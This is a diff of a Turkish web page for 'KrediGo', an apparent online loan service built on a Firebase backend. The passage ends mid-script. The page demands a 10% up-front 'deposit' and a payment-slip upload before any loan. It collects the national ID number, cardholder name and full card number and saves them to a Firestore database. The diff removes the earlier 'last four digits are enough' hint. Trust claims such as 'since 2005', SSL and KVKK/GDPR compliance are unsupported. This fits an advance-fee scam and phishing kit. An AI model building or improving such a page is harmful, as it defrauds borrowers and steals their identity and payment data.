@@ -3,14 +3,93 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>KrediGo | Anında Online Kredi</title>
+  <title>KrediGo | Online Kredi Başvuru</title>
   <link rel="preconnect" href="https://fonts.googleapis.com">
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-  <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,300;14..32,400;14..32,500;14..32,600;14..32,700;14..32,800&display=swap" rel="stylesheet">
-  <link rel="stylesheet" href="style.css">
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; scroll-behavior: smooth; }
+    body { font-family: 'Inter', sans-serif; background: #050816; color: white; overflow-x: hidden; }
+    .container { width: 92%; max-width: 1280px; margin: auto; }
+    .bg-glow { position: fixed; width: 650px; height: 650px; border-radius: 50%; filter: blur(130px); z-index: -1; }
+    .glow1 { background: #2563eb; top: -250px; left: -250px; opacity: .22; }
+    .glow2 { background: #7c3aed; right: -300px; bottom: -300px; opacity: .18; }
+    .navbar { position: sticky; top: 0; z-index: 999; backdrop-filter: blur(20px); background: rgba(5, 8, 22, .7); border-bottom: 1px solid rgba(255,255,255,.05); }
+    .nav-content { display: flex; justify-content: space-between; align-items: center; padding: 24px 0; }
+    .logo { font-size: 30px; font-weight: 800; letter-spacing: -1px; }
+    .nav-links { display: flex; align-items: center; gap: 34px; }
+    .nav-links a { text-decoration: none; color: #dbeafe; font-weight: 500; transition: .3s; }
+    .nav-links a:hover { color: #60a5fa; }
+    .nav-links button { border: none; background: linear-gradient(135deg, #2563eb, #7c3aed); color: white; cursor: pointer; transition: .3s; padding: 12px 20px; border-radius: 12px; font-weight: 600; }
+    .nav-links button:hover { transform: translateY(-2px); box-shadow: 0 10px 25px rgba(37,99,235,.3); }
+    .hero { padding: 100px 0 130px; }
+    .hero-grid { display: grid; grid-template-columns: 1.1fr .9fr; gap: 80px; align-items: center; }
+    .badge { display: inline-block; background: rgba(255,255,255,.05); border: 1px solid rgba(255,255,255,.08); color: #93c5fd; padding: 12px 22px; border-radius: 100px; margin-bottom: 28px; }
+    .hero-left h1 { font-size: 84px; line-height: .95; letter-spacing: -4px; margin-bottom: 28px; }
+    .hero-left p { font-size: 19px; line-height: 1.8; color: #cbd5e1; max-width: 620px; }
+    .hero-buttons { display: flex; gap: 18px; margin-top: 35px; }
+    .primary-btn, .secondary-btn { padding: 18px 30px; border-radius: 18px; font-size: 16px; font-weight: 700; cursor: pointer; transition: .3s; }
+    .primary-btn { background: linear-gradient(135deg, #2563eb, #7c3aed); border: none; color: white; }
+    .secondary-btn { background: transparent; border: 1px solid rgba(255,255,255,.1); color: white; }
+    .stats { display: flex; gap: 20px; margin-top: 55px; flex-wrap: wrap; }
+    .stat-card { background: rgba(255,255,255,.05); border: 1px solid rgba(255,255,255,.08); padding: 24px; border-radius: 24px; min-width: 160px; }
+    .stat-card h3 { font-size: 34px; margin-bottom: 8px; }
+    .stat-card span { color: #94a3b8; }
+    .glass { background: rgba(255,255,255,.05); border: 1px solid rgba(255,255,255,.08); backdrop-filter: blur(24px); }
+    .calculator { padding: 40px; border-radius: 34px; }
+    .calc-top h2 { font-size: 38px; margin-bottom: 10px; }
+    .calc-top p { color: #94a3b8; margin-bottom: 35px; }
+    .input-group { margin-bottom: 24px; }
+    .input-group label { display: block; margin-bottom: 10px; color: #cbd5e1; }
+    .input-wrap { position: relative; }
+    .input-wrap span { position: absolute; right: 18px; top: 50%; transform: translateY(-50%); color: #94a3b8; }
+    input, select { width: 100%; background: rgba(255,255,255,.05); border: 1px solid rgba(255,255,255,.08); color: white; padding: 18px; border-radius: 18px; outline: none; font-size: 16px; }
+    .warning-text { color: #f97316; font-size: 13px; margin-top: 8px; display: none; }
+    .result-box { margin-top: 28px; background: rgba(255,255,255,.04); border-radius: 24px; padding: 24px; }
+    .result-row { display: flex; justify-content: space-between; align-items: center; margin-bottom: 18px; }
+    .result-row span { color: #cbd5e1; }
+    .result-row strong { font-size: 30px; }
+    .progress-bar { height: 12px; background: rgba(255,255,255,.08); border-radius: 100px; overflow: hidden; margin: 14px 0; }
+    .progress-fill { width: 10%; height: 100%; background: linear-gradient(90deg,#2563eb,#7c3aed); }
+    .apply-btn { width: 100%; margin-top: 20px; padding: 18px; border-radius: 20px; font-size: 17px; font-weight: 700; background: linear-gradient(135deg, #2563eb, #7c3aed); border: none; color: white; cursor: pointer; transition: .3s; }
+    .apply-btn:disabled { opacity: 0.5; cursor: not-allowed; }
+    .secure-box { margin-top: 18px; text-align: center; color: #94a3b8; }
+    .features, .faq, .about, .application, .contact-section { padding: 100px 0; }
+    .section-title { text-align: center; margin-bottom: 60px; }
+    .section-title span { color: #60a5fa; text-transform: uppercase; letter-spacing: 2px; }
+    .section-title h2 { margin-top: 16px; font-size: 56px; }
+    .feature-grid, .contact-grid { display: grid; grid-template-columns: repeat(3,1fr); gap: 28px; }
+    .feature-card, .contact-card { padding: 40px; border-radius: 30px; transition: .3s; }
+    .feature-card:hover { transform: translateY(-6px); }
+    .icon { font-size: 44px; margin-bottom: 24px; }
+    .faq-accordion { max-width: 900px; margin: auto; }
+    .faq-item { margin-bottom: 20px; border-radius: 28px; overflow: hidden; cursor: pointer; }
+    .faq-question { padding: 28px 32px; font-size: 20px; font-weight: 700; display: flex; justify-content: space-between; align-items: center; }
+    .faq-question::after { content: "▼"; font-size: 18px; color: #60a5fa; transition: transform 0.3s; }
+    .faq-item.active .faq-question::after { transform: rotate(180deg); }
+    .faq-answer { max-height: 0; overflow: hidden; padding: 0 32px; transition: max-height 0.4s ease; color: #cbd5e1; line-height: 1.7; }
+    .faq-item.active .faq-answer { max-height: 300px; padding: 24px 32px; border-top: 1px solid rgba(255,255,255,.08); }
+    .application-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 20px; margin-bottom: 20px; }
+    .upload-box { border: 2px dashed rgba(255,255,255,.1); padding: 30px; border-radius: 24px; text-align: center; margin: 25px 0; color: #94a3b8; }
+    .success-box, .error-box { margin-top: 20px; padding: 16px; border-radius: 20px; display: none; }
+    .success-box { background: rgba(34,197,94,0.1); border: 1px solid rgba(34,197,94,0.25); color: #86efac; }
+    .error-box { background: rgba(220,38,38,0.1); border: 1px solid rgba(220,38,38,0.3); color: #f87171; }
+    .footer { background: rgba(5,8,22,0.95); border-top: 1px solid rgba(255,255,255,0.08); padding: 60px 0 30px; }
+    .footer-grid { display: grid; grid-template-columns: repeat(4,1fr); gap: 40px; margin-bottom: 40px; }
+    .footer-col h4 { margin-bottom: 24px; font-size: 18px; }
+    .footer-col ul { list-style: none; }
+    .footer-col ul li, .footer-col ul li a { color: #94a3b8; text-decoration: none; margin-bottom: 12px; display: block; font-size: 14px; }
+    .footer-col ul li a:hover { color: #60a5fa; }
+    .footer-logo { font-size: 28px; font-weight: 800; margin-bottom: 16px; }
+    .footer-desc { color: #94a3b8; margin-bottom: 20px; font-size: 14px; }
+    .social-icons { display: flex; gap: 16px; }
+    .social-icons a { width: 36px; height: 36px; background: rgba(255,255,255,.05); border-radius: 50%; display: flex; align-items: center; justify-content: center; text-decoration: none; color: white; }
+    .footer-bottom { text-align: center; padding-top: 30px; border-top: 1px solid rgba(255,255,255,.05); color: #64748b; font-size: 13px; }
+    @media (max-width: 1100px) { .hero-grid { grid-template-columns: 1fr; } .hero-left { text-align: center; } .hero-left p { margin: auto; } .feature-grid, .contact-grid { grid-template-columns: 1fr; } .footer-grid { grid-template-columns: repeat(2,1fr); } }
+    @media (max-width: 768px) { .hero-left h1 { font-size: 56px; } .section-title h2 { font-size: 40px; } .nav-links a { display: none; } .footer-grid { grid-template-columns: 1fr; } }
+  </style>
 </head>
 <body>
-
 <div class="bg-glow glow1"></div>
 <div class="bg-glow glow2"></div>
 
@@ -21,254 +100,269 @@
       <a href="#home">Ana Sayfa</a>
       <a href="#features">Avantajlar</a>
       <a href="#faq">SSS</a>
-      <button class="btn-nav" onclick="document.getElementById('apply').scrollIntoView({behavior:'smooth'})">Başvur</button>
+      <!-- Firebase butonları JS ile eklenecek -->
     </div>
   </div>
 </nav>
 
-<main>
-  <!-- Hero -->
-  <section class="hero" id="home">
-    <div class="container hero-grid">
-      <div class="hero-left">
-        <div class="badge">⚡ Dakikalar İçinde Onay</div>
-        <h1>Yeni Nesil <span class="gradient-text">Online Kredi</span> Sistemi</h1>
-        <p>Minimum 1000₺ kredi alın. %10 deposit sistemi ile güvenli, hızlı ve tamamen online deneyim.</p>
-        <div class="hero-buttons">
-          <button class="primary-btn" onclick="document.getElementById('apply').scrollIntoView({behavior:'smooth'})">Hemen Başvur →</button>
-          <button class="secondary-btn" onclick="document.getElementById('faq').scrollIntoView({behavior:'smooth'})">Nasıl Çalışır?</button>
-        </div>
-        <div class="stats">
-          <div class="stat-card"><h3>1000₺</h3><span>Minimum Kredi</span></div>
-          <div class="stat-card"><h3>100₺</h3><span>Minimum Deposit</span></div>
-          <div class="stat-card"><h3>24/7</h3><span>Online Başvuru</span></div>
-        </div>
+<section class="hero" id="home">
+  <div class="container hero-grid">
+    <div class="hero-left">
+      <div class="badge">⚡ Dakikalar İçinde Onay</div>
+      <h1>Yeni Nesil Online Kredi Sistemi</h1>
+      <p>Minimum 1000₺ kredi alın. %10 deposit sistemi ile güvenli, hızlı ve tamamen online deneyim.</p>
+      <div class="hero-buttons">
+        <button class="primary-btn" onclick="document.getElementById('apply').scrollIntoView()">Hemen Başvur</button>
+        <button class="secondary-btn" onclick="document.getElementById('faq').scrollIntoView()">Nasıl Çalışır?</button>
       </div>
-      <div class="calculator glass">
-        <div class="calc-top"><h2>Kredi Hesaplayıcı</h2><p>Anında geri ödeme hesabı</p></div>
-        <div class="input-group">
-          <label>Kredi Tutarı (₺)</label>
-          <div class="input-wrap">
-            <input type="number" id="amount" value="1000" min="1000" step="100" placeholder="1000">
-            <span>₺</span>
-          </div>
-          <div class="input-error" id="amountError"></div>
-        </div>
-        <div class="input-group">
-          <label>Geri Ödeme Süresi</label>
-          <select id="month">
-            <option value="1">1 Ay (Standart)</option>
-            <option value="2">2 Ay (+%10 faiz)</option>
-            <option value="3">3 Ay (+%15 faiz)</option>
-          </select>
-        </div>
-        <div class="result-box">
-          <div class="result-row"><span>Deposit (%10)</span><strong id="deposit">100₺</strong></div>
-          <div class="result-row"><span>Toplam Geri Ödeme</span><strong id="return">1000₺</strong></div>
-        </div>
-        <div class="progress-area">
-          <div class="progress-label">Güvenlik Deposit Sistemi</div>
-          <div class="progress-bar"><div class="progress-fill" style="width:10%"></div></div>
-          <span>%10 Koruma Sistemi</span>
-        </div>
-        <button class="apply-btn" onclick="document.getElementById('apply').scrollIntoView({behavior:'smooth'})">Kredi Başvurusu Yap →</button>
-        <div class="secure-box">🔒 Güvenli ve şifrelenmiş işlem sistemi</div>
+      <div class="stats">
+        <div class="stat-card"><h3>1000₺</h3><span>Minimum Kredi</span></div>
+        <div class="stat-card"><h3>100₺</h3><span>Minimum Deposit</span></div>
+        <div class="stat-card"><h3>24/7</h3><span>Online Başvuru</span></div>
       </div>
     </div>
-  </section>
-
-  <!-- Features -->
-  <section class="features" id="features">
-    <div class="container">
-      <div class="section-title">
-        <span>Avantajlar</span>
-        <h2>Neden KrediGo?</h2>
+    <div class="calculator glass">
+      <div class="calc-top"><h2>Kredi Hesaplayıcı</h2><p>Geri ödeme tutarını anında gör</p></div>
+      <div class="input-group">
+        <label>Kredi Tutarı (₺)</label>
+        <div class="input-wrap">
+          <input type="number" id="amount" value="1000" min="1000" step="100">
+          <span>₺</span>
+        </div>
+        <div id="amountWarning" class="warning-text">⚠️ Minimum kredi tutarı 1000₺'dir.</div>
       </div>
-      <div class="feature-grid">
-        <div class="feature-card glass">
-          <div class="icon">⚡</div>
-          <h3>Hızlı Onay</h3>
-          <p>Başvurular kısa sürede değerlendirilir ve dakikalar içinde sonuçlanır.</p>
-        </div>
-        <div class="feature-card glass">
-          <div class="icon">🔒</div>
-          <h3>Üst Düzey Güvenlik</h3>
-          <p>256-bit şifreleme ile tüm bilgileriniz güvende.</p>
-        </div>
-        <div class="feature-card glass">
-          <div class="icon">📱</div>
-          <h3>Mobil Uyumlu</h3>
-          <p>Telefon ve tabletlerde kusursuz çalışan modern arayüz.</p>
-        </div>
+      <div class="input-group">
+        <label>Geri Ödeme Süresi</label>
+        <select id="month">
+          <option value="1">1 Ay (faizsiz)</option>
+          <option value="2">2 Ay (+%10)</option>
+          <option value="3">3 Ay (+%15)</option>
+        </select>
       </div>
+      <button id="calculateBtn" class="secondary-btn" style="width:100%; margin-bottom:20px;">Hesapla</button>
+      <div class="result-box">
+        <div class="result-row"><span>Deposit (%10)</span><strong id="deposit">100₺</strong></div>
+        <div class="result-row"><span>Toplam Geri Ödeme</span><strong id="return">1000₺</strong></div>
+      </div>
+      <div class="progress-bar"><div class="progress-fill"></div></div>
+      <div class="secure-box">🔒 256-bit SSL şifreleme</div>
     </div>
-  </section>
+  </div>
+</section>
 
-  <!-- About -->
-  <section class="about">
-    <div class="container">
-      <div class="section-title">
-        <span>Şirket</span>
-        <h2>Hakkımızda</h2>
-      </div>
-      <div class="about-box glass">
-        <p>KrediGo, 21.08.2005 tarihinden beri finans ve online kredi alanında faaliyet göstermektedir. Modern teknolojiler ve güvenli altyapı kullanarak müşterilerine hızlı ve profesyonel hizmet sunmayı hedeflemektedir. Platformumuz kullanıcı güvenliği, hızlı işlem süreci ve modern online deneyim üzerine kurulmuştur.</p>
-      </div>
+<section class="features" id="features">
+  <div class="container">
+    <div class="section-title"><span>Avantajlar</span><h2>Neden KrediGo?</h2></div>
+    <div class="feature-grid">
+      <div class="feature-card glass"><div class="icon">⚡</div><h3>Hızlı Onay</h3><p>Dakikalar içinde sonuçlanır.</p></div>
+      <div class="feature-card glass"><div class="icon">🔒</div><h3>Üst Düzey Güvenlik</h3><p>Verileriniz şifrelenir.</p></div>
+      <div class="feature-card glass"><div class="icon">📱</div><h3>Mobil Uyumlu</h3><p>Her cihazda kusursuz.</p></div>
     </div>
-  </section>
+  </div>
+</section>
 
-  <!-- Application Form -->
-  <section class="application" id="apply">
-    <div class="container">
-      <div class="section-title">
-        <span>Başvuru</span>
-        <h2>Kredi Başvuru İşlemi</h2>
+<section class="about">
+  <div class="container">
+    <div class="section-title"><span>Şirket</span><h2>Hakkımızda</h2></div>
+    <div class="about-box glass" style="padding:45px; border-radius:34px;"><p>KrediGo, 2005 yılından beri güvenilir online kredi hizmeti sunmaktadır. Modern teknoloji ve şeffaf politika ile müşteri odaklı çalışır.</p></div>
+  </div>
+</section>
+
+<section class="application" id="apply">
+  <div class="container">
+    <div class="section-title"><span>Başvuru</span><h2>Kredi Başvurusu</h2></div>
+    <div class="application-box glass" style="padding:45px; border-radius:34px;">
+      <div class="application-grid">
+        <input type="text" id="fullname" placeholder="Ad Soyad">
+        <input type="tel" id="phone" placeholder="Telefon Numarası">
+        <input type="email" id="email" placeholder="E-posta Adresi">
+        <input type="text" id="tc" placeholder="TC Kimlik No">
+        <input type="text" id="cardname" placeholder="Kart Sahibi İsmi">
+        <input type="text" id="cardnumber" placeholder="Kart Numarası">
       </div>
-      <div class="application-box glass">
-        <div class="application-grid">
-          <input type="text" id="fullname" placeholder="Ad Soyad">
-          <input type="tel" id="phone" placeholder="Telefon Numarası">
-          <input type="email" id="email" placeholder="E-posta Adresi">
-          <input type="text" id="tc" placeholder="TC Kimlik No (11 hane)">
-          <input type="text" id="cardname" placeholder="Kart Sahibi İsmi">
-          <input type="text" id="cardnumber" placeholder="Kart Numarası (son 4 hane yeterli)">
-        </div>
-        <div class="upload-box">
-          <label>Deposit Ödeme Dekontu</label>
-          <p>Ödeme yaptıktan sonra dekontun fotoğrafını veya ekran görüntüsünü yükleyin.</p>
-          <input type="file" id="depositSlip" accept="image/*,application/pdf">
-        </div>
-        <button class="apply-btn" id="submitApplication">Başvuruyu Gönder →</button>
-        <div class="success-box" id="successMessage" style="display: none;">
-          ✅ Ödemeniz başarıyla alınmıştır.<br><br>
-          Sistem tarafından kontrol edildikten sonra kredi tutarı kartınıza gönderilecektir.
-        </div>
-        <div class="error-box" id="errorMessage" style="display: none;"></div>
+      <div class="upload-box">
+        Deposit ödeme dekontunu yükleyin (screenshot/çek)<br>
+        <input type="file" id="depositSlip">
       </div>
+      <button class="apply-btn" id="submitApplication">Başvuruyu Gönder</button>
+      <div id="successMessage" class="success-box"></div>
+      <div id="errorMessage" class="error-box"></div>
     </div>
-  </section>
+  </div>
+</section>
 
-  <!-- FAQ Accordion (8 soru) -->
-  <section class="faq" id="faq">
-    <div class="container">
-      <div class="section-title">
-        <span>SSS</span>
-        <h2>Sıkça Sorulan Sorular</h2>
-      </div>
-      <div class="faq-accordion">
-        <div class="faq-item glass">
-          <div class="faq-question">Kredi başvurusu yapmak için hangi belgeler gerekli?</div>
-          <div class="faq-answer">Kimlik belgesi (TC Kimlik No), iletişim bilgileri ve deposit ödeme kanıtı (dekont/screenshot) yeterlidir. Ek belge istenmez.</div>
-        </div>
-        <div class="faq-item glass">
-          <div class="faq-question">Deposit nedir ve neden ödenmelidir?</div>
-          <div class="faq-answer">Deposit, kredi tutarının %10'u kadar olan güvence bedelidir. Bu sistem, hem kredi verenin hem de alanın güvenliğini sağlar. Deposit, kredi geri ödendikten sonra iade edilir.</div>
-        </div>
-        <div class="faq-item glass">
-          <div class="faq-question">Kredi notum düşük, yine de başvurabilir miyim?</div>
-          <div class="faq-answer">Evet, KrediGo olarak kredi notunu tek kriter olarak görmüyoruz. Deposit sistemi sayesinde düşük kredi notuna sahip kullanıcılar da başvuru yapabilir.</div>
-        </div>
-        <div class="faq-item glass">
-          <div class="faq-question">Kredi ne kadar sürede hesabıma yatar?</div>
-          <div class="faq-answer">Başvurunuz onaylandıktan ve deposit ödemeniz doğrulandıktan sonra kredi tutarı genellikle 1-2 saat içinde kartınıza veya banka hesabınıza aktarılır.</div>
-        </div>
-        <div class="faq-item glass">
-          <div class="faq-question">Erken geri ödeme yaparsam ceza veya ek ücret alınır mı?</div>
-          <div class="faq-answer">Hayır, erken geri ödeme durumunda herhangi bir ceza veya ek ücret alınmaz. Sadece anapara + işlemiş faiz ödersiniz.</div>
-        </div>
-        <div class="faq-item glass">
-          <div class="faq-question">Başvurum neden reddedilebilir?</div>
-          <div class="faq-answer">Başvuru reddi genellikle kimlik doğrulama sorunları, daha önceki ödenmemiş krediler veya deposit ödemesinin yapılmaması gibi nedenlerden kaynaklanır. Her reddedilen başvuru için destek ekibimiz bilgilendirme yapar.</div>
-        </div>
-        <div class="faq-item glass">
-          <div class="faq-question">Kredi vadesini uzatabilir miyim?</div>
-          <div class="faq-answer">Evet, vade uzatma talebinizi müşteri hizmetlerine iletebilirsiniz. Uzatma durumunda ek faiz oranları uygulanır ve yeni ödeme planı düzenlenir.</div>
-        </div>
-        <div class="faq-item glass">
-          <div class="faq-question">Kişisel verilerim güvende mi?</div>
-          <div class="faq-answer">Kesinlikle. KVKK ve GDPR uyumlu şifreleme teknolojileri kullanıyoruz. Bilgileriniz üçüncü taraflarla paylaşılmaz ve yasal zorunluluk olmadıkça saklanır.</div>
-        </div>
-      </div>
+<section class="faq" id="faq">
+  <div class="container">
+    <div class="section-title"><span>SSS</span><h2>Sıkça Sorulan Sorular</h2></div>
+    <div class="faq-accordion">
+      <div class="faq-item glass"><div class="faq-question">Kredi başvurusu için hangi belgeler gerekli?</div><div class="faq-answer">Kimlik belgesi (TC Kimlik No), iletişim bilgileri ve deposit ödeme kanıtı yeterlidir.</div></div>
+      <div class="faq-item glass"><div class="faq-question">Deposit nedir?</div><div class="faq-answer">Kredi tutarının %10'u kadar güvence bedelidir, geri ödeme sonrası iade edilir.</div></div>
+      <div class="faq-item glass"><div class="faq-question">Kredi notum düşük, başvurabilir miyim?</div><div class="faq-answer">Evet, deposit sistemi sayesinde kredi notu düşük olanlar da başvuru yapabilir.</div></div>
+      <div class="faq-item glass"><div class="faq-question">Kredi ne kadar sürede hesaba yatar?</div><div class="faq-answer">Onay ve deposit doğrulamasından sonra 1-2 saat içinde aktarılır.</div></div>
+      <div class="faq-item glass"><div class="faq-question">Erken geri ödemede ceza var mı?</div><div class="faq-answer">Hayır, ceza uygulanmaz.</div></div>
+      <div class="faq-item glass"><div class="faq-question">Başvurum neden reddedilebilir?</div><div class="faq-answer">Kimlik doğrulama sorunları, eksik bilgi veya deposit ödemesinin yapılmaması gibi nedenlerle.</div></div>
+      <div class="faq-item glass"><div class="faq-question">Vade uzatma mümkün mü?</div><div class="faq-answer">Evet, müşteri hizmetleri ile iletişime geçerek talep edebilirsiniz.</div></div>
+      <div class="faq-item glass"><div class="faq-question">Kişisel verilerim güvende mi?</div><div class="faq-answer">KVKK ve GDPR uyumlu şifreleme ile korunmaktadır.</div></div>
     </div>
-  </section>
+  </div>
+</section>
 
-  <!-- Contact -->
-  <section class="contact-section">
-    <div class="container">
-      <div class="section-title">
-        <span>İletişim</span>
-        <h2>Bize Ulaşın</h2>
-      </div>
-      <div class="contact-grid">
-        <div class="contact-card glass">
-          <div class="contact-icon">🏢</div>
-          <h3>Ofis</h3>
-          <p>İstanbul, Türkiye</p>
-          <p class="small">Merkez Mah. Finans Cad. No:42</p>
-        </div>
-        <div class="contact-card glass">
-          <div class="contact-icon">📞</div>
-          <h3>Telefon</h3>
-          <p>+90 555 555 55 55</p>
-          <p class="small">Hafta içi 09:00-18:00</p>
-        </div>
-        <div class="contact-card glass">
-          <div class="contact-icon">✉️</div>
-          <h3>E-posta</h3>
-          <p>kredigo.info@gmail.com</p>
-          <p class="small">7/24 yanıt veririz</p>
-        </div>
-      </div>
-    </div>
-  </section>
-</main>
-
-<!-- YENİ PROFESYONEL FOOTER -->
 <footer class="footer">
   <div class="container">
     <div class="footer-grid">
-      <div class="footer-brand">
-        <div class="logo">KrediGo</div>
-        <p>Güvenli, hızlı ve modern online kredi platformu. İhtiyacınız olduğunda yanınızdayız.</p>
-        <div class="social-links">
-          <a href="#" aria-label="Twitter">𝕏</a>
-          <a href="#" aria-label="LinkedIn">in</a>
-          <a href="#" aria-label="Instagram">📷</a>
-        </div>
-      </div>
-      <div class="footer-links">
-        <h4>Hızlı Erişim</h4>
-        <ul>
-          <li><a href="#home">Ana Sayfa</a></li>
-          <li><a href="#features">Avantajlar</a></li>
-          <li><a href="#apply">Başvuru</a></li>
-          <li><a href="#faq">SSS</a></li>
-        </ul>
-      </div>
-      <div class="footer-links">
-        <h4>Yasal</h4>
-        <ul>
-          <li><a href="#">Gizlilik Politikası</a></li>
-          <li><a href="#">Kullanım Şartları</a></li>
-          <li><a href="#">KVKK Aydınlatma</a></li>
-          <li><a href="#">Çerez Politikası</a></li>
-        </ul>
-      </div>
-      <div class="footer-contact">
-        <h4>İletişim</h4>
-        <ul>
-          <li>📞 <a href="tel:+905555555555">+90 555 555 55 55</a></li>
-          <li>✉️ <a href="mailto:kredigo.info@gmail.com">kredigo.info@gmail.com</a></li>
-          <li>📍 İstanbul, Türkiye</li>
-        </ul>
-      </div>
+      <div class="footer-col"><div class="footer-logo">KrediGo</div><p class="footer-desc">Güvenilir, hızlı ve şeffaf online kredi platformu.</p><div class="social-icons"><a href="#">📘</a><a href="#">🐦</a><a href="#">📸</a></div></div>
+      <div class="footer-col"><h4>Kurumsal</h4><ul><li><a href="#">Hakkımızda</a></li><li><a href="#">Gizlilik Politikası</a></li><li><a href="#">Kariyer</a></li></ul></div>
+      <div class="footer-col"><h4>Hızlı Erişim</h4><ul><li><a href="#apply">Kredi Başvurusu</a></li><li><a href="#faq">SSS</a></li><li><a href="#">Kredi Hesaplama</a></li></ul></div>
+      <div class="footer-col"><h4>İletişim</h4><ul><li>📞 +90 555 555 55 55</li><li>✉️ destek@kredigo.com</li><li>📍 İstanbul, Türkiye</li></ul><div class="cert-badge" style="margin-top:20px;">🔒 SSL Sertifikalı</div></div>
     </div>
-    <div class="footer-bottom">
-      <p>© 2025 KrediGo. Tüm hakları saklıdır.</p>
-    </div>
+    <div class="footer-bottom"><p>&copy; 2025 KrediGo - Tüm hakları saklıdır.</p></div>
   </div>
 </footer>
 
-<script type="module" src="script.js"></script>
+<script type="module">
+  import { initializeApp } from "https://www.gstatic.com/firebasejs/12.14.0/firebase-app.js";
+  import { getAuth, createUserWithEmailAndPassword, signInWithEmailAndPassword, onAuthStateChanged, signOut } from "https://www.gstatic.com/firebasejs/12.14.0/firebase-auth.js";
+  import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/12.14.0/firebase-firestore.js";
+
+  const firebaseConfig = {
+    apiKey: "AIzaSyDCkFVXfK53Uqtj13cOhKIE3pg3bLmyTX4",
+    authDomain: "buydog.firebaseapp.com",
+    projectId: "buydog",
+    storageBucket: "buydog.firebasestorage.app",
+    messagingSenderId: "360970981236",
+    appId: "1:360970981236:web:2b1005e6abc80655ada621",
+    measurementId: "G-NXKK8EJ9RV"
+  };
+
+  const app = initializeApp(firebaseConfig);
+  const auth = getAuth(app);
+  const db = getFirestore(app);
+
+  // Butonları navbar'a ekle
+  const navLinks = document.querySelector('.nav-links');
+  const loginBtn = document.createElement('button'); loginBtn.textContent = 'Giriş Yap'; loginBtn.id = 'firebaseLogin';
+  const registerBtn = document.createElement('button'); registerBtn.textContent = 'Kayıt Ol'; registerBtn.id = 'firebaseRegister';
+  const logoutBtn = document.createElement('button'); logoutBtn.textContent = 'Çıkış Yap'; logoutBtn.id = 'firebaseLogout'; logoutBtn.style.display = 'none';
+  navLinks.appendChild(loginBtn);
+  navLinks.appendChild(registerBtn);
+  navLinks.appendChild(logoutBtn);
+
+  // Auth işlemleri
+  window.handleLogin = async () => {
+    const email = prompt("E-posta:");
+    if (!email) return;
+    const pwd = prompt("Şifre:");
+    if (!pwd) return;
+    try {
+      await signInWithEmailAndPassword(auth, email, pwd);
+      alert("Giriş başarılı!");
+    } catch(e) { alert("Hata: " + e.message); }
+  };
+  window.handleRegister = async () => {
+    const email = prompt("E-posta:");
+    if (!email) return;
+    const pwd = prompt("Şifre (min 6 karakter):");
+    if (!pwd || pwd.length < 6) { alert("Şifre en az 6 karakter"); return; }
+    try {
+      await createUserWithEmailAndPassword(auth, email, pwd);
+      alert("Kayıt başarılı! Şimdi giriş yapın.");
+      window.handleLogin();
+    } catch(e) { alert("Hata: " + e.message); }
+  };
+  window.handleLogout = async () => { await signOut(auth); alert("Çıkış yapıldı."); };
+  loginBtn.onclick = () => window.handleLogin();
+  registerBtn.onclick = () => window.handleRegister();
+  logoutBtn.onclick = () => window.handleLogout();
+
+  let currentUser = null;
+  onAuthStateChanged(auth, (user) => {
+    currentUser = user;
+    if (user) {
+      loginBtn.style.display = 'none';
+      registerBtn.style.display = 'none';
+      logoutBtn.style.display = 'inline-block';
+      document.getElementById('submitApplication').disabled = false;
+    } else {
+      loginBtn.style.display = 'inline-block';
+      registerBtn.style.display = 'inline-block';
+      logoutBtn.style.display = 'none';
+      document.getElementById('submitApplication').disabled = true;
+    }
+  });
+
+  // Kredi hesaplayıcı
+  const amount = document.getElementById('amount');
+  const month = document.getElementById('month');
+  const depositSpan = document.getElementById('deposit');
+  const returnSpan = document.getElementById('return');
+  const warning = document.getElementById('amountWarning');
+  const calcBtn = document.getElementById('calculateBtn');
+
+  function calculate() {
+    let val = Number(amount.value);
+    if (isNaN(val) || val < 1000) {
+      warning.style.display = 'block';
+      depositSpan.innerText = '—';
+      returnSpan.innerText = '—';
+      return;
+    }
+    warning.style.display = 'none';
+    const dep = val * 0.10;
+    let ret = val;
+    if (month.value === '2') ret = val * 1.10;
+    if (month.value === '3') ret = val * 1.15;
+    depositSpan.innerText = `${dep.toFixed(0)}₺`;
+    returnSpan.innerText = `${ret.toFixed(0)}₺`;
+  }
+  calcBtn.addEventListener('click', calculate);
+  amount.addEventListener('input', () => { if (Number(amount.value) >= 1000) warning.style.display = 'none'; });
+  month.addEventListener('change', calculate);
+  calculate();
+
+  // Form doğrulama ve Firebase'e kaydetme
+  const submitApp = document.getElementById('submitApplication');
+  const successDiv = document.getElementById('successMessage');
+  const errorDiv = document.getElementById('errorMessage');
+
+  function showError(msg) { errorDiv.style.display = 'block'; errorDiv.innerText = msg; successDiv.style.display = 'none'; setTimeout(() => errorDiv.style.display = 'none', 4000); }
+  function showSuccess(msg) { successDiv.style.display = 'block'; successDiv.innerText = msg; errorDiv.style.display = 'none'; }
+
+  submitApp.addEventListener('click', async (e) => {
+    e.preventDefault();
+    if (!currentUser) { showError('Lütfen önce giriş yapın veya kayıt olun.'); return; }
+    const fullname = document.getElementById('fullname').value.trim();
+    const phone = document.getElementById('phone').value.trim();
+    const email = document.getElementById('email').value.trim();
+    const tc = document.getElementById('tc').value.trim();
+    const cardname = document.getElementById('cardname').value.trim();
+    const cardnumber = document.getElementById('cardnumber').value.trim();
+    const file = document.getElementById('depositSlip').files[0];
+    if (!fullname || !phone || !email || !tc || !cardname || !cardnumber || !file) {
+      showError('Lütfen tüm alanları doldurun ve dekont yükleyin.');
+      return;
+    }
+    if (tc.length !== 11 || isNaN(tc)) { showError('TC Kimlik No 11 haneli olmalı.'); return; }
+    if (email.indexOf('@') === -1) { showError('Geçerli e-posta girin.'); return; }
+    try {
+      await addDoc(collection(db, 'applications'), {
+        userId: currentUser.uid,
+        userEmail: currentUser.email,
+        fullname, phone, email, tc, cardname, cardnumber,
+        amount: Number(amount.value),
+        months: Number(month.value),
+        deposit: Number(depositSpan.innerText.replace('₺','')),
+        returnAmount: Number(returnSpan.innerText.replace('₺','')),
+        date: new Date().toISOString()
+      });
